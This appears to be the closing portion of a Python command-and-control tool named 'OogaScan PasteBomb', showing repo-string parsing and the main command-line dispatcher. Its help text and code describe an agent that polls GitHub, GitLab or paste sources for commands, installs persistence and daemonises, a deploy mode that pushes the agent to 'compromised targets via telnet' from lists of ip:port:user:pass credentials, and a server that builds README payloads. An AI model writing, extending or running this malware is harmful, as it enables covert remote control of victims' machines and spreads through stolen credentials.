        return RepoSource(owner="", repo=paste_id, platform="debian",
                          branch="", file_path="")

    if repo_str.startswith("gl:") or repo_str.startswith("gitlab:"):
        plat = "gitlab"
        repo_str = repo_str.split(":", 1)[1]
    elif repo_str.startswith("gh:") or repo_str.startswith("github:"):
        plat = "github"
        repo_str = repo_str.split(":", 1)[1]

    if ":" in repo_str:
        repo_part, rest = repo_str.split(":", 1)
        if "/" in rest:
            branch, file_path = rest.split("/", 1)
        else:
            branch = rest
    else:
        repo_part = repo_str

    parts = repo_part.split("/")
    if len(parts) != 2:
        print(f"{C.RED}[!] Invalid repo format: {r} (expected [gh:|gl:|dp:]owner/repo){C.RESET}")
        sys.exit(1)

    return RepoSource(owner=parts[0], repo=parts[1], platform=plat,
                      branch=branch, file_path=file_path)


def main():
    import argparse
    parser = argparse.ArgumentParser(
        description="OogaScan PasteBomb — GitHub & GitLab Dead-Drop C2",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
modes:
  agent    Run the C2 agent (polls repos for commands)
  server   Interactive shell to generate README payloads
  deploy   Deploy agent to compromised targets via telnet
  config   Generate a default config file
  test     Test fetching from configured repos

repo format:
  owner/repo                        GitHub repo (default)
  gh:owner/repo                     GitHub repo (explicit)
  gl:owner/repo                     GitLab repo
  owner/repo:branch                 Custom branch
  gl:owner/repo:main/path/file.md   Custom path

examples:
  %(prog)s agent -c pb_config.json
  %(prog)s agent -r user/repo1 -r gl:user/repo2 --daemon
  %(prog)s server
  %(prog)s deploy -f output/results.jsonl -r user/c2-repo
  %(prog)s config -r user/c2-primary -r gl:user/c2-backup
  %(prog)s test -c pb_config.json
""",
    )
    parser.add_argument("mode", choices=["agent", "server", "config", "test", "deploy"],
                        help="Operating mode")
    parser.add_argument("-c", "--config", default=CONFIG_FILE,
                        help="Config file path")
    parser.add_argument("-r", "--repo", action="append", default=[],
                        help="Repo source ([gh:|gl:]owner/repo[:branch[/path]]). Repeatable.")
    parser.add_argument("-i", "--interval", type=int, default=0,
                        help="Poll interval in seconds")
    parser.add_argument("--api", action="store_true",
                        help="Use platform API instead of raw URLs")
    parser.add_argument("-f", "--targets-file", default="",
                        help="File with deployment targets (results.jsonl or ip:port:user:pass)")
    parser.add_argument("--no-persist", action="store_true",
                        help="Don't install persistence")
    parser.add_argument("--daemon", action="store_true",
                        help="Run agent as background daemon")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    if not args.daemon:
        print(BANNER)

    cli_repos = [_parse_repo_arg(r) for r in args.repo]

    if args.mode == "config":
        config = PBConfig(repos=cli_repos or [
            RepoSource(owner="youruser", repo="c2-primary", platform="github"),
            RepoSource(owner="youruser", repo="c2-backup1", platform="github"),
            RepoSource(owner="youruser", repo="c2-backup2", platform="gitlab"),
        ])
        if args.interval > 0:
            config.poll_interval = args.interval
        config.use_api = args.api
        config.save(args.config)
        print(f"{C.GREEN}[*] Config saved to {args.config}{C.RESET}")
        print(f"    Edit the repo entries, then run: pastebomb.py agent -c {args.config}")
        return

    elif args.mode == "server":
        server_shell()
        return

    elif args.mode == "test":
        config = PBConfig.load(args.config)
        if cli_repos:
            config.repos = cli_repos

        if not config.repos:
            print(f"{C.RED}[!] No repos configured. Use -r or -c.{C.RESET}")
            sys.exit(1)

        print(f"[*] Testing {len(config.repos)} repo(s)...\n")
        for repo in config.repos:
            print(f"  {C.BOLD}{repo}{C.RESET}")
            content = fetch_from_repo(repo, use_api=config.use_api)
            if content is not None:
                commands, _ = extract_commands(content)
                print(f"    {C.GREEN}OK{C.RESET} — {len(content)} bytes, "
                      f"{len(commands)} command(s) found")
                for cmd in commands:
                    print(f"      {C.YELLOW}> {cmd}{C.RESET}")
            else:
                print(f"    {C.RED}FAIL{C.RESET} — unreachable")
            print()
        return

    elif args.mode == "deploy":
        if not args.targets_file:
            print(f"{C.RED}[!] Deploy mode requires -f <targets_file>{C.RESET}")
            print(f"    File format: results.jsonl from scanner, or ip:port:user:pass per line")
            sys.exit(1)

        targets = load_deploy_targets(args.targets_file)
        if not targets:
            print(f"{C.RED}[!] No valid targets found in {args.targets_file}{C.RESET}")
            sys.exit(1)

        repo_strs = [r for r in args.repo]
        if not repo_strs:
            config = PBConfig.load(args.config)
            repo_strs = []
            for r in config.repos:
                if r.platform == "debian":
                    repo_strs.append(f"dp:{r.repo}")
                elif r.platform == "gitlab":
                    repo_strs.append(f"gl:{r.owner}/{r.repo}")
                else:
                    repo_strs.append(f"{r.owner}/{r.repo}")

        if not repo_strs:
            print(f"{C.RED}[!] No repos specified. Use -r or configure repos in config.{C.RESET}")
            sys.exit(1)

        print(f"[*] Targets: {len(targets)}")
        print(f"[*] Repos: {', '.join(repo_strs)}")

        success, fail = deploy_to_targets(targets, repo_strs, verbose=args.verbose)
        print(f"\n{C.GREEN}[*] Deploy complete: {success} success, {fail} failed{C.RESET}")
        return

    elif args.mode == "agent":
        config = PBConfig.load(args.config)
        if cli_repos:
            config.repos = cli_repos
        if args.interval > 0:
            config.poll_interval = args.interval
        if args.api:
            config.use_api = True

        if not config.repos:
            print(f"{C.RED}[!] No repos configured. Use -r or -c.{C.RESET}")
            sys.exit(1)

        if not args.no_persist:
            install_persistence(args.config)

        if args.daemon:
            daemonize()

        agent_loop(config, verbose=args.verbose)


if __name__ == "__main__":
    main()
